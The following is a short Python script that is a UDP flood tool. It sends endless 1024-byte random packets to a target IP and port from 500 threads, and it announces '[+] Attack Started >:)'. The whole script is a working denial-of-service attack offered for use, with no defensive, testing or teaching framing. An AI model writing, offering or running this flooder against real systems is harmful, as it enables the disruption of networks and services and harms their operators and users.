#!/usr/bin/env python3
from os import device_encoding
import socket,random,sys,threading
from typing import Counter


ip = sys.argv[1]
port = sys.argv[2]

pack = random._urandom(1024)


s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("[+] Attack Started >:)")

def attack():
    while True:
        s.sendto(pack, (ip,int(port)))
        
            




for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()